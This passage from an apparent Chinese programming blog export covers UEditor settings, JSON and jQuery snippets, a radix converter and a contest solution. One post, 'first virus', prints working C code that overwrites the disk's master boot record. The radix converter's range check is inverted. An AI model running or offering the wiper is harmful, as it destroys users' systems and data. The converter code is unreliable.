<h2 id="在这里列举一下配置的属性："><a href="#在这里列举一下配置的属性：" class="headerlink" title="在这里列举一下配置的属性："></a>在这里列举一下配置的属性：</h2><h2 id="前端配置项说明"><a href="#前端配置项说明" class="headerlink" title="前端配置项说明"></a>前端配置项说明</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">UEDITOR_HOME_URL &#123;Path String&#125; [默认值：根据config文件路径自动获取] // 为编辑器实例添加一个路径，这个不能被注释</span><br><span class="line">serverUrl &#123;Path String&#125; [默认值：URL + &quot;php/controller.php&quot;] // 服务器统一请求接口路径</span><br><span class="line">toolbars &#123;2d Array&#125; //工具栏上的所有的功能按钮和下拉框，可以在new编辑器的实例时选择自己需要的从新定义</span><br><span class="line">labelMap &#123;Object&#125; [默认：从lang包的labelMap项获取] //参数格式是键值对，键名对应toolbar参数的项：&#123;&quot;bold&quot;: &quot;加粗&quot;&#125; ]，当鼠标放在工具栏上时显示的tooltip提示，留空支持自动多语言配置，否则以配置值为准</span><br><span class="line">lang &#123;String&#125; [默认值：&quot;zh-cn&quot;] //lang值也可以通过自动获取 (navigator.language||navigator.browserLanguage ||navigator.userLanguage).toLowerCase()，语言配置项，默认是zh-cn。有需要的话也可以使用如下这样的方式来自动多语言切换，当然，前提条件是lang文件夹下存在对应的语言文件：</span><br><span class="line">langPath &#123;Path String&#125; [默认值：URL +&quot;lang/&quot;] //语言包文件存放目录</span><br><span class="line">theme &#123;String&#125; [默认值：&apos;default&apos;] //主题配置项，默认是default。有需要的话也可以使用如下这样的方式来自动多主题切换，当然，前提条件是themes文件夹下存在对应的主题文件：</span><br><span class="line">themePath &#123;Path String&#125; [默认值：URL +&quot;themes/&quot;] //现有如下皮肤：default</span><br><span class="line">zIndex &#123;Number&#125; [默认值：900] //编辑器在页面上的z-index层级的基数，默认是900</span><br><span class="line">charset &#123;String&#125; [默认值：&quot;utf-8&quot;] //针对getAllHtml方法，会在对应的head标签中增加该编码设置。</span><br><span class="line">customDomain &#123;Boolean&#125; [默认值：false] //若实例化编辑器的页面手动修改的domain，此处需要设置为true</span><br><span class="line">isShow &#123;Boolean&#125; [默认值：true] //默认显示编辑器</span><br><span class="line">textarea &#123;String&#125; [默认值：&apos;editorValue&apos;] // 提交表单时，服务器获取编辑器提交内容的所用的参数，多实例时可以给容器name属性，会将name给定的值最为每个实例的键值，不用每次实例化的时候都设置这个值</span><br><span class="line">initialContent &#123;String&#125; [默认值：&apos;欢迎使用ueditor!&apos;] //初始化编辑器的内容，也可以通过textarea/script给值，看官网例子</span><br><span class="line">autoClearinitialContent &#123;Boolean&#125; [默认值：true] //是否自动清除编辑器初始内容，注意：如果focus属性设置为true，这个也为真，那么编辑器一上来就会触发导致初始化的内容看不到了</span><br><span class="line">focus &#123;Boolean&#125; [默认值：false] //初始化时，是否让编辑器获得焦点true或false</span><br><span class="line">initialStyle &#123;String&#125; [默认值：&apos;p&#123;line-height:1em&#125;&apos;]//编辑器层级的基数，可以用来改变字体等 //如果自定义，最好给p标签如下的行高，要不输入中文时，会有跳动感</span><br><span class="line">iframeCssUrl &#123;Path String&#125; [默认值：URL + &apos;/themes/iframe.css&apos;] //给编辑器内部引入一个css文件</span><br><span class="line">indentValue &#123;String&#125; [默认值：&apos;2em&apos;] //首行缩进距离，默认是2em</span><br><span class="line">initialFrameWidth &#123;Number&#125; [默认值：1000] //初始化编辑器宽度，默认1000</span><br><span class="line">initialFrameHeight &#123;Number&#125; [默认值：320] //初始化编辑器高度，默认320</span><br><span class="line">readonly &#123;Boolean&#125; [默认值：false] //编辑器初始化结束后，编辑区域是否是只读的，默认是false</span><br><span class="line">autoClearEmptyNode &#123;Boolean&#125; [默认值：true] //getContent时，是否删除空的inlineElement节点（包括嵌套的情况）</span><br><span class="line">enableAutoSave &#123;Boolean&#125; [默认值：true] //启用自动保存</span><br><span class="line">saveInterval &#123;Number&#125; [默认值：500] //自动保存间隔时间，单位ms</span><br><span class="line">imageScaleEnabled &#123;Boolean&#125; [默认值：true] //启用图片拉伸缩放</span><br><span class="line">fullscreen &#123;Boolean&#125; [默认值：false] //是否开启初始化时即全屏，默认关闭</span><br><span class="line">imagePopup &#123;Boolean&#125; [默认值：true] //图片操作的浮层开关，默认打开</span><br><span class="line">autoSyncData &#123;Boolean&#125; [默认值：true] //自动同步编辑器要提交的数据</span><br><span class="line">emotionLocalization &#123;Boolean&#125; [默认值：false] //是否开启表情本地化，默认关闭。若要开启请确保emotion文件夹下包含官网提供的images表情文件夹</span><br><span class="line">retainOnlyLabelPasted &#123;Boolean&#125; [默认值：false] //粘贴只保留标签，去除标签所有属性</span><br><span class="line">pasteplain &#123;Boolean&#125; [默认值：false] //是否默认为纯文本粘贴。false为不使用纯文本粘贴，true为使用纯文本粘贴</span><br><span class="line">filterTxtRules &#123;Object&#125; //纯文本粘贴模式下的过滤规则</span><br><span class="line">allHtmlEnabled [默认值：false] //提交到后台的数据是否包含整个html字符串</span><br><span class="line">insertorderedlist //有序列表的下拉配置，值留空时支持多语言自动识别，若配置值，则以此值为准</span><br><span class="line">insertunorderedlist //无序列表的下拉配置，值留空时支持多语言自动识别，若配置值，则以此值为准</span><br><span class="line">listDefaultPaddingLeft [默认值：&apos;30&apos;//默认的左边缩进的基数倍</span><br><span class="line">listiconpath [默认值：&apos;http://bs.baidu.com/listicon/&apos;]//自定义标号的路径</span><br><span class="line">maxListLevel [默认值：3] //限制可以tab的级数， 设置-1为不限制</span><br><span class="line">autoTransWordToList [默认值：false] //禁止word中粘贴进来的列表自动变成列表标签</span><br><span class="line">fontfamily //字体设置 label留空支持多语言自动切换，若配置，则以配置值为准</span><br><span class="line">fontsize &#123;Array&#125; //字号</span><br><span class="line">paragraph &#123;Object&#125; //段落格式 值留空时支持多语言自动识别，若配置，则以配置值为准</span><br><span class="line">rowspacingtop &#123;Array&#125; //段间距 值和显示的名字相同</span><br><span class="line">rowspacingbottom //段间距 值和显示的名字相同</span><br><span class="line">lineheight [默认值：[&apos;1&apos;, &apos;1.5&apos;,&apos;1.75&apos;,&apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;] ] //行内间距 值和显示的名字相同</span><br><span class="line">customstyle [Array] //自定义样式，不支持国际化，此处配置值即可最后显示值block的元素是依据设置段落的逻辑设置的，inline的元素依据BIU的逻辑设置，尽量使用一些常用的标签</span><br><span class="line">enableContextMenu &#123;Boolean&#125; [默认值：true] //打开右键菜单功能</span><br><span class="line">contextMenu &#123;Object&#125; //右键菜单的内容，可以参考plugins/contextmenu.js里边的默认菜单的例子，label留空支持国际化，否则以此配置为准</span><br><span class="line">shortcutMenu &#123;Array&#125; //快捷菜单</span><br><span class="line">elementPathEnabled &#123;Boolean&#125; [默认值：true] //是否启用元素路径，默认是显示</span><br><span class="line">wordCount &#123;Boolean&#125; [默认值：true] //是否开启字数统计</span><br><span class="line">maximumWords &#123;Number&#125; [默认值：10000] //允许的最大字符数</span><br><span class="line">wordCountMsg &#123;String&#125; [默认值：] //当前已输入 &#123;#count&#125; 个字符，您还可以输入&#123;#leave&#125; 个字符，字数统计提示，&#123;#count&#125;代表当前字数，&#123;#leave&#125;代表还可以输入多少字符数，留空支持多语言自动切换，否则按此配置显示</span><br><span class="line">wordOverFlowMsg &#123;String&#125; [默认值：] //超出字数限制提示 留空支持多语言自动切换，否则按此配置显示</span><br><span class="line">tabSize &#123;Number&#125; [默认值：4] //点击tab键时移动的距离，tabSize倍数，tabNode什么字符做为单位</span><br><span class="line">tabNode &#123;String&#125; [默认值：&apos;&apos;]</span><br><span class="line">removeFormatTags //清除格式时可以删除的标签和属性</span><br><span class="line">removeFormatAttributes [默认值：&apos;class,style,lang,width,height,align,hspace,valign&apos;</span><br><span class="line">maxUndoCount &#123;Number&#125; [默认值：20] //undo操作，可以最多回退的次数，默认20</span><br><span class="line">maxInputCount &#123;Number&#125; [默认值：1] //undo操作，当输入的字符数超过该值时，保存一次现场</span><br><span class="line">autoHeightEnabled &#123;Boolean&#125; [默认值：true] //是否自动长高，默认true</span><br><span class="line">scaleEnabled &#123;Boolean&#125; [默认值：false] //是否可以拉伸长高，默认true(当开启时，自动长高失效)</span><br><span class="line">minFrameWidth &#123;Number&#125; [默认值：800] //编辑器拖动时最小宽度，默认800</span><br><span class="line">minFrameHeight &#123;Number&#125; [默认值：220] //编辑器拖动时最小高度，默认220</span><br><span class="line">autoFloatEnabled [默认值：true] //是否保持toolbar的位置不动，默认true</span><br><span class="line">topOffset [默认值：30] //浮动时工具栏距离浏览器顶部的高度，用于某些具有固定头部的页面</span><br><span class="line">toolbarTopOffset [默认值：400] //编辑器底部距离工具栏高度(如果参数大于等于编辑器高度，则设置无效)</span><br><span class="line">pageBreakTag [默认值：&apos;ueditorpagebreaktag&apos;] //分页标识符，默认是ueditorpagebreaktag</span><br><span class="line">autotypeset &#123;Object&#125; //自动排版参数 默认值：</span><br><span class="line">tableDragable &#123;Boolean&#125; [默认值：true] //表格是否可以拖拽</span><br><span class="line">disabledTableInTable &#123;Boolean&#125; [默认值：true] //禁止表格嵌套</span><br><span class="line">sourceEditor &#123;String&#125; [默认值：&quot;codemirror&quot;] //源码的查看方式，codemirror是代码高亮，textarea是文本框，默认是codemirror，注意默认codemirror只能在ie8+和非ie中使用</span><br><span class="line">codeMirrorJsUrl &#123;Path String&#125; [默认值：URL + &quot;third-party/codemirror/codemirror.js&quot;] //如果sourceEditor是codemirror需要配置这项，codeMirror js加载的路径</span><br><span class="line">codeMirrorCssUrl &#123;Path String&#125; [默认值：URL + &quot;third-party/codemirror/codemirror.css&quot;] //如果sourceEditor是codemirror需要配置这项，codeMirror css加载的路径</span><br><span class="line">sourceEditorFirst &#123;String&#125; [默认值：false] //编辑器初始化完成后是否进入源码模式，默认为否。</span><br><span class="line">iframeUrlMap &#123;Object&#125; //dialog内容的路径 ～会被替换成URL，垓属性一旦打开，将覆盖所有的dialog的默认路径</span><br><span class="line">webAppKey &#123;String&#125; //webAppKey 百度应用的APIkey，每个站长必须首先去百度官网注册一个key后方能正常使用app功能，注册介绍，http://app.baidu.com/static/cms/getapikey.html</span><br><span class="line">allowDivTransToP &#123;Boolean&#125; 默认会将外部进入的html数据中的Div标签转换成P标签，外部进入的数据包括粘贴和调用setContent接口进入编辑器的数据。如果设置成false将不在做这个转换。</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> ueditor </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[json取值方法]]></title>
      <url>/2014/json-get-value-method/</url>
      <content type="html"><![CDATA[<p>本篇文章讲解json取值的两种方式</p>
<p>在js中有两种方式是用来取出json中的值</p>
<a id="more"></a>
<ol>
<li>.的方式取值(data.key)</li>
<li>[]的方式取值(data[key])</li>
</ol>
<p>看下面的一个例子：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> json=&#123;  </span><br><span class="line">    r1:<span class="string">'123'</span>,  </span><br><span class="line">    r2:<span class="string">'123'</span>,  </span><br><span class="line">    r3:<span class="string">'123'</span>,  </span><br><span class="line">    r4:<span class="string">'123'</span>,  </span><br><span class="line">    r5:<span class="string">'123'</span>,  </span><br><span class="line">    r6:<span class="string">'123'</span>,  </span><br><span class="line">    r7:<span class="string">'123'</span>,  </span><br><span class="line">    r8:<span class="string">'123'</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们要取出每一个元素，肯定最简单方法就是循环遍历了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;=<span class="number">8</span>；i++)&#123;</span><br><span class="line">    <span class="comment">//但是这里如果使用第一种方式，这样调用是不行的，我们必须使用第二种方式调用。</span></span><br><span class="line">    <span class="comment">//var t = "r"+i;</span></span><br><span class="line">    <span class="comment">//var value = json.t;  // 但是你这样写是可以的:json."r1",就是不能进行变量的拼接</span></span><br><span class="line">    <span class="keyword">var</span> value = json[<span class="string">"r"</span>+i]; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是这么简单，哈哈</p>
]]></content>
      
        <categories>
            
            <category> javascript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> javascript </tag>
            
            <tag> json </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[jquery动态生成表单提交]]></title>
      <url>/2014/jquery-build-form/</url>
      <content type="html"><![CDATA[<p>我们有时候在提交一些参数的时候不想写隐藏表单时，我们可以使用jquery动态生成form<br>但是在动态生成表单时，不同浏览器兼容性是不一样的。</p>
<a id="more"></a>
<p>所以会遇到一些问题，可能你在chrome上能够运行，但是IE上不一定能够运行，我今天遇到的问题就是我做一个导出Excel需要带参数的跳转，window.location.href的方式满足不了我的需求，所有就用到了动态生成form<br>使用jquery生成form很简单<br>下面是一段简单的代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> result = $(<span class="string">'#printDIV'</span>).html();</span><br><span class="line"><span class="keyword">var</span> xlsName = <span class="string">"excel文件"</span>;</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">"exportExcel/export"</span>;</span><br><span class="line"><span class="keyword">var</span> form = $(<span class="string">"&lt;form&gt;&lt;/form&gt;"</span>);</span><br><span class="line">form.attr(<span class="string">"action"</span>, url);</span><br><span class="line">form.attr(<span class="string">"method"</span>, <span class="string">"post"</span>);</span><br><span class="line">form.append(<span class="string">"&lt;textarea name='result'&gt;"</span>+result+<span class="string">"&lt;/textarea&gt;"</span>);</span><br><span class="line">form.append(<span class="string">"&lt;textarea name='xlsName'&gt;"</span>+ xlsName +<span class="string">"&lt;/textarea&gt;"</span>);</span><br><span class="line"><span class="comment">// ie8 必须要使用 appendTo("body") 经过测试</span></span><br><span class="line"><span class="comment">// chrome 35.0 版本是可以不需要 appendTo("body")</span></span><br><span class="line">form.appendTo(<span class="string">"body"</span>).submit();</span><br><span class="line"><span class="comment">// 渲染成功后移除表单form，否则页面中会出现表单</span></span><br><span class="line">form.remove();</span><br></pre></td></tr></table></figure>
<p><strong>解决办法就是加上appendTo(“body”);</strong></p>
]]></content>
      
        <categories>
            
            <category> javascript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> javascript </tag>
            
            <tag> jquery </tag>
            
            <tag> form </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[javascript写九九乘法表]]></title>
      <url>/2013/javascript-jiujiuchengfabiao/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 九九乘法表<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">      &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">       tr td&#123;</span><br><span class="line">         border:2px solid green;</span><br><span class="line">         font-size:20px;</span><br><span class="line">         font-weight:bold;</span><br><span class="line">       &#125;</span><br><span class="line">       &lt;/style&gt;</span><br><span class="line">       &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">       document.write(&quot;&lt;table&gt;&quot;);</span><br><span class="line">       for(var x=1;x&lt;=9;x++)&#123;</span><br><span class="line">            document.write(&quot;&lt;tr&gt;&quot;);</span><br><span class="line">            for(var y=1;y&lt;=x;y++)&#123;</span><br><span class="line">                document.write(&quot;&lt;td&gt;&quot; + y + &quot;*&quot; + x + &quot;=&quot; + (x*y) + &quot;&lt;/td&gt;&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">            document.write(&quot;&lt;/tr&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        document.write(&quot;&lt;/table&gt;&quot;);</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> javascript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[任意进制的转换]]></title>
      <url>/2013/java-any-hex-convert/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 BigInteger实现进制转换</p>
<p>这个进制的转换最大支持36进制，也就是10进制+26个字母用到了BigInteger类的toString(int radix)方法<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package cn.xxz;</span><br><span class="line">import java.util.*;</span><br><span class="line">import java.math.*;</span><br><span class="line">public class Num2Radix &#123;</span><br><span class="line">	public static void main( String[] args ) &#123; /*最大支持36进制转换*/</span><br><span class="line">		Scanner sc	= new Scanner( System.in );</span><br><span class="line">		int	num	= sc.nextInt();</span><br><span class="line">		int	radix	= sc.nextInt();</span><br><span class="line">		if ( radix &lt; 36 ) &#123;</span><br><span class="line">			System.out.println( &quot;不支持大于36进制的转换！&quot; );</span><br><span class="line">			return;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println( test( num, radix ) );</span><br><span class="line">	&#125;</span><br><span class="line">	public static String test( int num, int radix ) &#123;</span><br><span class="line">		BigInteger	b	= new BigInteger( num + &quot;&quot; );</span><br><span class="line">		String		str	= b.toString( radix );</span><br><span class="line">		return(str);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 10进制 </tag>
            
            <tag> 36进制 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[第一个病毒]]></title>
      <url>/2013/first-virus/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 使用c写一个小程序<br>下面是初学c语言写的代码（测试，自行承担后果哦）：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;stdlib.h&gt; </span><br><span class="line"> </span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line"> char buffer[512]=&quot;0&quot;;</span><br><span class="line">    FILE * fd=fopen(&quot;\\\\.\\PHYSICALDRIVE0&quot;,&quot;rb+&quot;); </span><br><span class="line">    if (fd == NULL) </span><br><span class="line">        return 0;  </span><br><span class="line">    fseek(fd,0,SEEK_SET); </span><br><span class="line">    fwrite(buffer,512,1,fd);</span><br><span class="line"> printf(&quot;hello,你中毒了！\n&quot;);</span><br><span class="line">    fclose(fd); </span><br><span class="line">    return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> c </category>
            
        </categories>
        
        
        <tags>
            
            <tag> c </tag>
            
            <tag> 病毒 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2012蓝桥杯java高职题目分析]]></title>
      <url>/2013/2012-lqb-java/</url>
      <content type="html"><![CDATA[<p>30年的改革开放，给中国带来了翻天覆地的变化。<br>2011全年中国手机产量约为11.72亿部。手机已经成为百姓的基本日用品！<br>给手机选个好听又好记的号码可能是许多人的心愿。<br>但号源有限，只能辅以有偿选号的方法了。<br>这个程序的目的就是：根据给定的手机尾号（4位），按照一定的规则来打分。<br>其规则如下：</p>
<a id="more"></a>
<ol>
<li>如果出现连号，不管升序还是降序，都加5分。<br>例如：5678,4321都满足加分标准。</li>
<li>前三个数字相同，或后三个数字相同，都加3分。<br>例如：4888,6665,7777都满足加分的标准。<br>注意：7777因为满足这条标准两次，所以这条规则给它加了6分。</li>
<li>符合AABB或者ABAB模式的加1分。<br>例如：2255,3939,7777都符合这个模式，所以都被加分。<br>注意：7777因为满足这条标准两次，所以这条标准给它加了2分。</li>
<li>含有：6，8，9中任何一个数字，每出现一次加1分。<br>例如4326,6875,9918都符合加分标准。其中，6875被加2分；9918被加3分。<br>尾号最终得分就是每条标准的加分总和！<br>要求程序从标准输入接收数据，在标准输出上输出结果。<br>输入格式为：第一行是一个整数n（&lt;100），表示下边有多少输入行，接下来是n行4位一组的数据，就是等待计算加分的手机尾号。<br>输出格式为：n行整数。<br>例如，输入：<br>14<br>3045<br>0211<br>2345<br>6543<br>7777<br>8888<br>7878<br>7788<br>6688<br>2424<br>2244<br>9918<br>6789<br>8866<br>则输出：<br>0<br>0<br>5<br>6<br>8<br>12<br>3<br>3<br>5<br>1<br>1<br>3<br>8<br>5</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * 分析，对于这道题目，把每一个要求细化</span><br><span class="line"> */</span><br><span class="line">import java.util.*;</span><br><span class="line">public class T6 &#123;</span><br><span class="line">	public static void main( String[] args )</span><br><span class="line">	&#123;</span><br><span class="line">		Scanner sc = new Scanner( System.in );</span><br><span class="line">		System.out.print( &quot;请输入行数：&quot; );</span><br><span class="line">		int	rows	= sc.nextInt();</span><br><span class="line">		int	score[] = new int[rows];</span><br><span class="line">		for ( int i = 0; i &lt; rows; i++ )</span><br><span class="line">		&#123;</span><br><span class="line">			String	str	= sc.next();</span><br><span class="line">			int	a	= Integer.parseInt( str.charAt( 0 ) + &quot;&quot; );</span><br><span class="line">			int	b	= Integer.parseInt( str.charAt( 1 ) + &quot;&quot; );</span><br><span class="line">			int	c	= Integer.parseInt( str.charAt( 2 ) + &quot;&quot; );</span><br><span class="line">			int	d	= Integer.parseInt( str.charAt( 3 ) + &quot;&quot; );</span><br><span class="line">			score[i] = test6( a, b, c, d );</span><br><span class="line">		&#125;</span><br><span class="line">		for ( int i : score )</span><br><span class="line">			System.out.println( i );</span><br><span class="line">	&#125;</span><br><span class="line">	public static int test6( int a, int b, int c, int d )</span><br><span class="line">	&#123;</span><br><span class="line">		int score = 0;</span><br><span class="line">/*不管升序还是降序，都加5分。例如：5678,4321都满足加分标准 */</span><br><span class="line">		if ( (a == b + 1 &amp;&amp; b == c + 1 &amp;&amp; c == d + 1) || (a == b - 1 &amp;&amp; b == c - 1 &amp;&amp; c == d - 1) )</span><br><span class="line">			score += 5;</span><br><span class="line">/*</span><br><span class="line"> * 前三个数字相同，或后三个数字相同，都加3分。</span><br><span class="line"> * 例如：4888,6665,7777都满足加分的标准。</span><br><span class="line"> * 7777因为满足这条标准两次，所以这条规则给它加了6分。</span><br><span class="line"> */</span><br><span class="line">		if ( a == b &amp;&amp; b == c )</span><br><span class="line">			score += 3;</span><br><span class="line">		if ( b == c &amp;&amp; c == d )</span><br><span class="line">			score += 3;</span><br><span class="line">/*</span><br><span class="line"> * 符合AABB或者ABAB模式的加1分。例如：2255,3939,</span><br><span class="line"> * 7777因为满足这条标准两次，所以这条标准给它加了2分。</span><br><span class="line"> */</span><br><span class="line">		if ( a == b &amp;&amp; c == d )</span><br><span class="line">			score += 1;</span><br><span class="line">		if ( a == c &amp;&amp; b == d )</span><br><span class="line">			score += 1;</span><br><span class="line">/*</span><br><span class="line"> * 含有：6，8，9中任何一个数字，每出现一次加1分。</span><br><span class="line"> * 例如4326,6875,9918都符合加分标准。</span><br><span class="line"> * 其中，6875被加2分；9918被加3分。</span><br><span class="line"> */</span><br><span class="line">		if ( a == 6 )</span><br><span class="line">			score += 1;</span><br><span class="line">		else if ( a == 8 )</span><br><span class="line">			score += 1;</span><br><span class="line">		else if ( a == 9 )</span><br><span class="line">			score += 1;</span><br><span class="line">		if ( b == 6 )</span><br><span class="line">			score += 1;</span><br><span class="line">		else if ( b == 8 )</span><br><span class="line">			score += 1;</span><br><span class="line">		else if ( b == 9 )</span><br><span class="line">			score += 1;</span><br><span class="line">		if ( c == 6 )</span><br><span class="line">			score += 1;</span><br><span class="line">		else if ( c == 8 )</span><br><span class="line">			score += 1;</span><br><span class="line">		else if ( c == 9 )</span><br><span class="line">			score += 1;</span><br><span class="line">		if ( d == 6 )</span><br><span class="line">			score += 1;</span><br><span class="line">		else if ( d == 8 )</span><br><span class="line">			score += 1;</span><br><span class="line">		else if ( d == 9 )</span><br><span class="line">			score += 1;</span><br><span class="line">		return(score);</span><br><span class="line">	&#125;</span><br><span 